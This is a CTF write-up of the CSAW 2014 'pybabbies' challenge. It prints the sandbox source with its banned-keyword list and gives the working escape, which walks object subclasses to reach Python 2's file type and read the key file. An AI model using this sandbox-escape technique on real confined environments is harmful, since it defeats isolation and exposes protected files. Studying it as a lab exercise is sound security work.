Title: CSAW 2014 Writeup: pybabbies
Date:   2014-09-26
Category: writeups
Tags: ctf,writeups,csaw,exploitation
Slug: csaw14
Authors: rixx
Summary: Writeup of the pybabbies task at the recent CSAW14. Category: Exploitation. Points: 200. Team: krebs.

At the recent [CSAW14](https://ctf.isis.poly.edu/challenges#) I participated with the [krebs](http://krebsco.de/writeups/index.html) team. Sadly, I had only little time for the CTF, but I managed to complete one task nonetheless. It was called **pybabbies**, belonged to the category **Exploitation** and yielded **200** points (on a scale from 100 to 500).

## The Task

We were to connect to `54.165.210.171 12345` where we were greeted by a Python shell. Thankfully the code for this shell was included in the task:


    #!/usr/bin/env python 
    
    from __future__ import print_function
    
    print("Welcome to my Python sandbox! Enter commands below!")
    
    banned = [
        "import",
        "exec",
        "eval",
        "pickle",
        "os",
        "subprocess",
        "kevin sucks",
        "input",
        "banned",
        "cry sum more",
        "sys"
    ]
    
    targets = __builtins__.__dict__.keys()
    targets.remove('raw_input')
    targets.remove('print')
    for x in targets:
        del __builtins__.__dict__[x]
    
    while 1:
        print(">>>", end=' ')
        data = raw_input()
    
        for no in banned:
            if no.lower() in data.lower():
                print("No bueno")
                break
        else: # this means nobreak
            exec data

As you can see, this is a Python2 script. What it does is essentially the following:

* It removes all builtin functions and variables except for `raw_input` and `print`. This means we can't use any implicitly or explicitly used builtins such as `len` (which is commonly implicitly used in existental statements).
* It starts a REPL loop.
* It executes every (one-line) command we enter … except if it contains a banned word. Such as … `import`. Or `sys`. Or `os`. Or `eval` or `exec` or `input`. Basically everything we would want to escape the sandbox and find the keyfile.


## The Solution

Now, what we really want to do, is getting access to a file without importing any module, sending executable input or using builtin functions. This means we need access to the `file` type, which we can use to access and open files. Sooo, how do we access a file without any of this?

    >>> subclasses = ().__class__.__base__.__subclasses__()

This might look like a bit of magic, but it's really not that bad. Basically it takes a normal (albeit empty) tuple, `()`, then gets its class, which is `<type 'tuple'>`. `__base__` gets the base class of `tuple` which is `object`. `__subclasses__()` is closest to magic. It returns a list of weak references of the immediate subclasses of a class. Thankfully, in Python many classes subclass `object` directly. If this hadn't succeeded, we'd just gone on level further down the `__subclasses__()` output.

But we were lucky: at `subclasses[40]` there was `<type 'file'>`. The remainder was just finding the keyfile.

    >>> file_type = subclasses[40]
    >>> key_file = file_type('./key','r')
    >>> key = key_file.read()
    >>> print(key)
    flag{definitely_not_intro_python}

